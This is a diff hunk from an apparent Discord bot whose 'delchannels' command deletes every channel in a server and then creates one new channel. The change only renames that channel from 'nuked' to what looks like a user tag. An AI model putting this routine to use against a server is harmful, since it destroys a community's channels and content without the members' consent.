@@ -64,6 +64,6 @@ async def delchannels(ctx):
     for channel in list(ctx.guild.channels):
      await channel.delete()  
     guild = ctx.message.guild
-    await guild.create_text_channel("nuked")
+    await guild.create_text_channel("sumzum#1827")
 
 bot.run(TOKEN) 
